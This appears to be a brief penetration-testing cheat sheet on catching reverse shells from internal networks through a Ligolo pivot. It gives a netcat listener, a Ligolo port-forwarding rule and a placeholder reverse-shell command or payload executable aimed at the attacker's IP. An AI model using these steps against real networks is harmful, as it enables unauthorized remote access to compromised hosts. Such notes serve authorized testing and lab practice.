# Reverse Shells from Internal Networks

### 1) Setup listener on Kali

    nc -lvnp KALI_PORT

### 2) Setup a listener for the reverse shell in the Ligolo session

    listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp

### 3) Run a reverse shell command or payload

    [command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
    or
    ./payload.exe
